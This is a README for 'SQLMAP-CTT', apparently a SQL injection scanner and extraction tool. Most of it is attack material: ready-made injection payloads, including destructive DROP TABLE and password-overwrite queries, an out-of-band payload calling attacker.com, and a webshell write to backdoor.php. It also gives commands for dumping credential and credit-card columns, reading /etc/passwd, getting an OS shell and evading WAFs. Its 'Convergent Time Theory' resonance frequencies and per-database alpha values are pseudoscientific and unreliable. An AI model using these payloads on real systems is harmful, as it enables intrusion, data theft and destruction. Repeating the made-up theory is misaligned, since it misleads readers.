# SQLMAP-CTT v2.0 - Convergent Time Theory Enhanced SQL Injection Scanner

![CTT Banner](https://img.shields.io/badge/CTT-33--Layer%20Fractal%20Resonance-blue)
![Python](https://img.shields.io/badge/Python-3.8%2B-green)
![License](https://img.shields.io/badge/License-Research-purple)

## 📖 Overview

**SQLMAP-CTT v2.0** is an advanced SQL injection detection and data extraction tool based on **Convergent Time Theory (CTT)**, featuring 33-layer fractal resonance payload generation and temporal inference algorithms. Developed by Americo Simoes, this tool represents a paradigm shift in SQL injection testing by applying mathematical resonance patterns and temporal dispersion principles to enhance detection and extraction capabilities.

### 🔥 Key Innovations

- **33-Layer Fractal Resonance Engine**: Multi-dimensional payload generation using prime number sequences
- **Convergent Time Theory (CTT)**: Temporal dispersion coefficient (α = 0.0302011) for enhanced detection
- **Post Data Support**: Full HTTP POST parameter testing with form auto-detection
- **Resonance Frequency Tuning**: Target-specific frequency optimization (default: 587000 Hz)
- **Parallel Temporal Threads**: Multi-threaded layer testing for faster scans
- **α-Dispersion Encoding**: Mathematical payload transformation resistant to WAF detection
- **Advanced Data Extraction**: Multi-phase database enumeration and data exfiltration with CTT optimization

## 📋 Author & Copyright

**Author:** Americo Simoes  
**Email:** amexsimoes@gmail.com  
**Copyright:** © 2026 Americo Simoes. All rights reserved.  
**Research Group:** CTT Research Group (SimoesCTT)  
**Version:** 2.0 - Fixed with POST Data Support

**⚠️ Legal Notice:** This tool is for authorized security testing and research purposes only. Unauthorized use is prohibited.

## 🚀 Features

### Core Capabilities
- ✅ **33-layer fractal payload generation** with prime number resonance
- ✅ **POST data support** (`--data` parameter) with auto-parsing
- ✅ **GET parameter testing** from URL query strings
- ✅ **Form field auto-detection** from HTML responses
- ✅ **Multiple SQLi techniques**: Error-based, Time-based, UNION-based, Boolean-based, Blind
- ✅ **Temporal signature analysis** for advanced detection
- ✅ **Resonance pattern matching** using frequency tuning
- ✅ **Parallel execution** with configurable thread counts
- ✅ **Comprehensive JSON reporting** with CTT-specific metrics
- ✅ **Custom prime sequences** for specialized resonance patterns

### **Advanced Data Extraction Features**
- ✅ **Database Fingerprinting**: Identify DBMS type, version, and configuration
- ✅ **Schema Enumeration**: Extract database, table, and column structures
- ✅ **Data Exfiltration**: Extract sensitive data with CTT-optimized queries
- ✅ **File System Access**: Read server files when possible
- ✅ **Privilege Escalation**: Check and attempt privilege elevation
- ✅ **OS Command Execution**: Execute system commands when vulnerabilities allow
- ✅ **Resonance-Optimized Extraction**: Use CTT layers for faster data retrieval
- ✅ **Batch Data Extraction**: Parallel data retrieval with temporal threading

## 🛠 Installation

### Quick Install
```bash
git clone https://github.com/SimoesCTT/sqlmap-ctt.git
cd sqlmap-ctt
pip install numpy scipy requests
chmod +x sqlmap-ctt.py
```

### Requirements File
Create `requirements.txt`:
```txt
numpy>=1.21.0
scipy>=1.7.0
requests>=2.26.0
```

## 📖 Complete Usage Guide

### Basic Detection Scan
```bash
./sqlmap-ctt.py -u "http://target.com/page?id=1"
```

### POST Parameter Testing
```bash
./sqlmap-ctt.py -u "http://target.com/login" --data "username=admin&password=test"
```

### Full CTT Configuration with Extraction
```bash
./sqlmap-ctt.py -u "http://target.com/search" \
  --data "q=test&submit=go" \
  --ctt-alpha=0.0302011 \
  --resonance-freq=587000 \
  --temporal-threads=11 \
  --timeout=30 \
  --extract-all \
  --extract-depth=3
```

### Advanced Attack with Custom Primes
```bash
./sqlmap-ctt.py -u "http://target.com/admin/" \
  --data "user=admin&pass=test&submit=Login" \
  --ctt-primes="2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97" \
  --resonance-freq=440000 \
  --attack-mode=aggressive \
  --extract-data \
  --os-shell
```

## 🔧 Complete Command Line Arguments

### Basic Options
| Argument | Description | Default |
|----------|-------------|---------|
| `-u, --url` | Target URL (required) | - |
| `--data` | POST data (e.g., "param1=value1&param2=value2") | "" |
| `--timeout` | Request timeout in seconds | 15 |

### CTT Configuration
| Argument | Description | Default |
|----------|-------------|---------|
| `--ctt-alpha` | CTT temporal dispersion coefficient | 0.0302011 |
| `--ctt-primes` | Custom prime numbers (comma-separated) | "" |
| `--resonance-freq` | Resonance frequency in Hz | 587000 |
| `--temporal-threads` | Number of parallel testing threads | 11 |
| `--layers` | Number of CTT layers to use (1-33) | 33 |

### Attack Modes
| Argument | Description | Default |
|----------|-------------|---------|
| `--attack-mode` | Attack intensity (gentle, normal, aggressive) | normal |
| `--injection-type` | Force injection type (error, time, union, boolean, blind) | auto |
| `--technique` | SQLi technique (E=Error, T=Time, U=Union, B=Boolean, S=Stacked) | E,T,U,B |

### Extraction Options
| Argument | Description | Default |
|----------|-------------|---------|
| `--extract-all` | Full database enumeration and extraction | false |
| `--extract-data` | Extract data from vulnerable tables | false |
| `--extract-depth` | Extraction depth (1=basic, 2=schema, 3=full data) | 2 |
| `--tables` | Specific tables to extract (comma-separated) | "" |
| `--columns` | Specific columns to extract | "" |
| `--dump` | Dump all data from database | false |
| `--os-shell` | Attempt OS command execution | false |
| `--file-read` | Read server files | false |
| `--privilege-check` | Check database privileges | false |

### Output Options
| Argument | Description | Default |
|----------|-------------|---------|
| `--output` | Output file for JSON report | auto-generated |
| `--verbose` | Verbose output level (0-3) | 1 |
| `--save-traffic` | Save all HTTP traffic to file | false |
| `--report-format` | Report format (json, html, txt) | json |

## 🎯 Complete Injection Types Supported

### 1. Error-Based SQL Injection
```
' AND 1=CONVERT(int, @@version)--
' AND 1=CAST(@@version AS int)--
' AND 1=(SELECT COUNT(*) FROM information_schema.tables)--
' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))--
' AND UPDATEXML(1, CONCAT(0x7e, @@version), 1)--
```

### 2. Time-Based SQL Injection
```
' AND SLEEP(5)--
' OR SLEEP(5)--
' AND BENCHMARK(1000000, MD5('test'))--
' AND IF(1=1, SLEEP(5), 0)--
' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
```

### 3. UNION-Based SQL Injection
```
' UNION SELECT NULL, @@version--
' UNION SELECT NULL, user(), database()--
' UNION SELECT NULL, table_name FROM information_schema.tables--
' UNION SELECT NULL, column_name FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username, password FROM users--
```

### 4. Boolean-Based Blind SQL Injection
```
' AND 1=1--
' AND 1=2--
' AND SUBSTRING(@@version,1,1)='5'--
' AND ASCII(SUBSTRING((SELECT user()),1,1))>97--
' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--
```

### 5. Stacked Queries (Batch)
```
'; DROP TABLE users; --
'; INSERT INTO users (username, password) VALUES ('hacker', 'pass'); --
'; UPDATE users SET password='hacked' WHERE username='admin'; --
```

### 6. Out-of-Band (OOB) SQL Injection
```
' AND LOAD_FILE('\\\\attacker.com\\share\\test.txt')--
' INTO OUTFILE '/var/www/html/backdoor.php'--
' INTO DUMPFILE '/etc/passwd'--
```

## 📊 Complete Data Extraction Guide

### Phase 1: Database Fingerprinting
```bash
# Get database version
./sqlmap-ctt.py -u "http://target.com?id=1" --extract-depth=1

# Output includes:
# - Database type (MySQL, PostgreSQL, MSSQL, Oracle, SQLite)
# - Version information
# - Current user and database
# - Character set and collation
```

### Phase 2: Schema Enumeration
```bash
# Enumerate all databases
./sqlmap-ctt.py -u "http://target.com?id=1" --extract-depth=2

# Enumerate specific database tables
./sqlmap-ctt.py -u "http://target.com?id=1" --tables="users,products,admin"

# Enumerate table columns
./sqlmap-ctt.py -u "http://target.com?id=1" --columns="users.username,users.password"
```

### Phase 3: Data Extraction
```bash
# Dump specific table
./sqlmap-ctt.py -u "http://target.com?id=1" --dump --tables="users"

# Extract specific columns
./sqlmap-ctt.py -u "http://target.com?id=1" --extract-data --columns="username,password,email"

# Full database dump
./sqlmap-ctt.py -u "http://target.com?id=1" --dump --extract-all
```

### Phase 4: Advanced Extraction
```bash
# Read server files
./sqlmap-ctt.py -u "http://target.com?id=1" --file-read="/etc/passwd"
./sqlmap-ctt.py -u "http://target.com?id=1" --file-read="/var/www/html/config.php"

# OS command execution
./sqlmap-ctt.py -u "http://target.com?id=1" --os-shell

# Check database privileges
./sqlmap-ctt.py -u "http://target.com?id=1" --privilege-check

# Write files to server
./sqlmap-ctt.py -u "http://target.com?id=1" --file-write="backdoor.php" --file-dest="/var/www/html/"
```

## 🔬 CTT-Optimized Extraction Techniques

### Resonance-Based Data Retrieval
```python
# CTT-optimized UNION queries use prime number patterns
' UNION SELECT NULL,CONCAT(table_name,0x3a,column_name) FROM information_schema.columns WHERE table_name IN (SELECT table_name FROM information_schema.tables LIMIT 0,1)--'
' UNION SELECT NULL,CONCAT(0x7e,@@version,0x7e,user(),0x7e,database())--'
```

### Time-Based CTT Extraction
```python
# CTT timing with prime-based delays
' AND IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 0,1),1,1))>100, SLEEP(3), 0)--'
' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT user()),1,1))>97) THEN SLEEP(5) ELSE 0 END)--'
```

### Boolean CTT Extraction
```python
# CTT-enhanced boolean extraction
' AND (SELECT ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin' LIMIT 0,1),1,1))>50)--'
' AND (SELECT LENGTH(table_name) FROM information_schema.tables LIMIT 0,1)=10--'
```

## 📁 Extraction Output Structure

### Generated Files
```
reports/
├── ctt_report_20260101_120000.json     # Full JSON report
├── extracted_data_20260101_120000/     # Extracted data directory
│   ├── database_info.txt               # Database fingerprint
│   ├── schemas/                        # Schema information
│   │   ├── database1_tables.txt
│   │   ├── database1_columns.txt
│   │   └── database1_indexes.txt
│   ├── data/                           # Extracted data
│   │   ├── users.txt
│   │   ├── products.txt
│   │   └── admin_logs.txt
│   ├── files/                          # Retrieved files
│   │   ├── etc_passwd.txt
│   │   └── config_files/
│   └── os/                             # OS information
│       ├── system_info.txt
│       ├── users.txt
│       └── processes.txt
└── traffic_logs/                       # HTTP traffic logs
    ├── requests.log
    └── responses.log
```

## 🧪 Complete Examples

### Example 1: Full Website Audit
```bash
./sqlmap-ctt.py -u "https://example.com/products.php?id=1" \
  --attack-mode=aggressive \
  --technique=E,T,U,B,S \
  --extract-all \
  --extract-depth=3 \
  --temporal-threads=15 \
  --resonance-freq=440000 \
  --output=full_audit_report.json \
  --verbose=3
```

### Example 2: Targeted Data Extraction
```bash
./sqlmap-ctt.py -u "http://test.com/login.php" \
  --data="username=test&password=test&submit=Login" \
  --tables="users,customers,transactions" \
  --columns="username,password,email,credit_card" \
  --extract-data \
  --file-read="/etc/passwd" \
  --os-shell \
  --timeout=30
```

### Example 3: Advanced CTT Research
```bash
./sqlmap-ctt.py -u "http://research.target.com/api/v1/data" \
  --data="query=getData&id=1" \
  --ctt-alpha=0.025 \
  --ctt-primes="2,3,5,7,13,17,19,23,31,37,41,43,47,53,59,61" \
  --resonance-freq=880000 \
  --layers=25 \
  --technique=E,T \
  --extract-depth=2 \
  --save-traffic \
  --report-format=html
```

## 🛡️ Security & Ethical Guidelines

### Authorized Testing Only
```bash
# Always obtain written permission
# Use only on systems you own or have explicit authorization to test
# Respect privacy and data protection laws (GDPR, CCPA, etc.)
```

### Responsible Disclosure
1. Identify vulnerabilities using CTT
2. Document findings with evidence
3. Contact system owner/administrator
4. Provide technical details and remediation advice
5. Allow reasonable time for fixes
6. Publish findings only after fixes are deployed

### Legal Compliance
- **Computer Fraud and Abuse Act (CFAA)** - US Law
- **General Data Protection Regulation (GDPR)** - EU Law
- **Data Protection Act 2018** - UK Law
- **Penal Code 502** - California Law
- **Other applicable national and international laws**

## 🔬 Advanced CTT Research Parameters

### Optimal Alpha Values by DBMS
| Database | Optimal α | Resonance Frequency |
|----------|-----------|---------------------|
| MySQL | 0.0302011 | 587000 Hz |
| PostgreSQL | 0.0275000 | 440000 Hz |
| Microsoft SQL | 0.0321500 | 880000 Hz |
| Oracle | 0.0289000 | 660000 Hz |
| SQLite | 0.0250000 | 330000 Hz |

### Prime Sequences for Resonance
```python
# Default CTT Prime Sequence (33 primes)
CTT_PRIMES = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47, 53, 
              59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107, 109, 113, 
              127, 131, 137]

# Enhanced Resonance Sequence (for advanced attacks)
ENHANCED_PRIMES = [2, 3, 5, 7, 11, 13, 17, 19, 23, 29, 31, 37, 41, 43, 47,
                   53, 59, 61, 67, 71, 73, 79, 83, 89, 97, 101, 103, 107,
                   109, 113, 127, 131, 137, 139, 149, 151, 157, 163, 167,
                   173, 179, 181, 191, 193, 197, 199]
```

## 🐛 Troubleshooting & Debugging

### Common Issues and Solutions

#### 1. Connection Issues
```bash
# Increase timeout
./sqlmap-ctt.py -u "http://target.com" --timeout=45

# Use proxy
export HTTP_PROXY="http://proxy:8080"
export HTTPS_PROXY="http://proxy:8080"
```

#### 2. Detection False Positives/Negatives
```bash
# Adjust CTT parameters
./sqlmap-ctt.py -u "http://target.com" --ctt-alpha=0.025 --resonance-freq=440000

# Try different techniques
./sqlmap-ctt.py -u "http://target.com" --technique=U,B --attack-mode=gentle

# Use custom primes
./sqlmap-ctt.py -u "http://target.com" --ctt-primes="2,3,5,7,11,13,17,19,23"
```

#### 3. WAF/IPS Evasion
```bash
# Use CTT resonance tuning
./sqlmap-ctt.py -u "http://target.com" --resonance-freq=330000 --layers=20

# Slow down requests
./sqlmap-ctt.py -u "http://target.com" --temporal-threads=3 --timeout=60

# Use alternate encoding
# Modify CTT_FractalEngine._apply_layer_resonance() for custom encoding
```

#### 4. Extraction Performance
```bash
# Increase threads for faster extraction
./sqlmap-ctt.py -u "http://target.com" --temporal-threads=20 --extract-all

# Limit extraction scope
./sqlmap-ctt.py -u "http://target.com" --tables="users" --columns="username,password"

# Use batch extraction
# Add --batch-size=100 parameter (custom implementation)
```

## 📈 Performance Optimization

### Memory Management
```python
# Adjust these in CTT_SQLInjectionEngine.__init__()
self.max_payload_cache = 1000  # Max payloads to cache
self.response_cache_size = 100  # Max responses to cache
self.parallel_requests = 11     # Optimal for CTT resonance
```

### Network Optimization
```python
# In CTT_SQLInjectionEngine._send_request()
# Add connection pooling
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

adapter = HTTPAdapter(
    pool_connections=100,
    pool_maxsize=100,
    max_retries=Retry(total=3, backoff_factor=0.1)
)
self.session.mount('http://', adapter)
self.session.mount('https://', adapter)
```

## 🤝 Contributing & Research

### Contributing to CTT Research
We welcome contributions in:
1. **Algorithm Development**: New resonance patterns, extraction methods
2. **Performance Optimization**: Faster scanning, better memory usage
3. **Detection Evasion**: Advanced WAF bypass techniques
4. **Database Support**: Additional DBMS fingerprinting and extraction
5. **Documentation**: Usage guides, research papers, tutorials

### Research Collaboration
Contact: americo.simoes@ctt-research.org

Areas of interest:
- Quantum computing applications for CTT
- Machine learning-enhanced resonance detection
- Cross-protocol SQL injection techniques
- Cloud database exploitation methodologies


## 📄 License & Copyright

```
SQLMAP-CTT v2.0 - Convergent Time Theory Enhanced SQL Injection Scanner
Copyright © 2026 Americo Simoes. All rights reserved.

This software is provided for educational and research purposes only.
Unauthorized use, distribution, or modification is strictly prohibited.

Commercial use requires explicit written permission from the author.
Academic use requires proper citation and attribution.

Author: Americo Simoes
Email: amexsimoes@gmail.com
Website: https://github.com/SimoesCTT
```

## 📞 Contact & Support

**Primary Contact:** Americo Simoes  
**Email:** amexsimoes@gmail.coms  


---

**⚡ CTT RESEARCH GROUP - ADVANCING SECURITY THROUGH MATHEMATICS**  
**🔬 SCIENCE • SECURITY • INNOVATION • ETHICS**
